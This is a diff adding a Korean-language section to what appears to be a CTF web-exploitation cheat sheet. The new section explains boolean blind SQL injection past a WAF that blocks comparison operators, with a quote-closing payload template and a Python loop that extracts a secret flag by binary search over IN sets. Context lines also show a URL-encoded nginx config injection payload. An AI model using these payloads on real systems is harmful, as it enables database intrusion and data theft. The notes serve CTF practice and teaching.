@@ -277,6 +277,30 @@ http://example.com/#%3B%7D%7D%7D%0A%0Assl_engine%20../../../../../../mnt/share/p
 - CSS 길이 제한이 있으면 prefix 길이에 따라 batch 크기를 줄인다.
 - attribute string 안의 `"`, `\`, 제어문자는 CSS string escape로 처리하고, `}` 같은 문자는 string 내부에 넣어 rule 구조를 깨지 않게 한다.
 
+### Equality WAF + Request-Limited Blind SQLi에서 IN 집합 이분 탐색
+
+Boolean-based Blind SQLi에서 `=`/`>`/`<`가 막히고 요청 횟수가 제한되면 `IN (...)`으로 후보 집합을 절반씩 나눈다.
+secret이 `flag{md5}`처럼 고정 prefix/suffix와 16진수 본문을 가지면, 본문 한 글자는 16개 후보이므로 정확히 4회 판정하고 32자리는 128회에 추출할 수 있다.
+
+체크리스트:
+- `substr`, 서브쿼리, 작은따옴표, 쉼표, `IN`이 각각 허용되는지 최소 요청으로 확인한다.
+- 서버가 입력 뒤에 quote를 붙이면 `1' and (<condition>) and '1`처럼 끝내서 `=` 없이 유효한 참 조건을 만든다.
+- 후보 절반을 `in ('0','1',...)`에 넣고 TRUE면 왼쪽, FALSE면 오른쪽 절반만 남긴다.
+- 리셋이 flag를 재발급하는 서비스에서는 추출 도중 리셋하지 않는다. `알 수 없는 글자 수 * ceil(log2(후보 수))`와 정찰 요청을 먼저 예산화한다.
+
+```python
+alphabet = list("0123456789abcdef")
+for pos in range(6, 38):
+    candidates = alphabet[:]
+    while len(candidates) > 1:
+        half = len(candidates) // 2
+        left = candidates[:half]
+        values = ",".join(repr(ch) for ch in left)
+        cond = f"substr((select flag from secret limit 1),{pos},1) in ({values})"
+        candidates = left if oracle(cond) else candidates[half:]
+    flag += candidates[0]
+```
+
 ### SSTI
 ```python
 # Jinja2 기본 확인
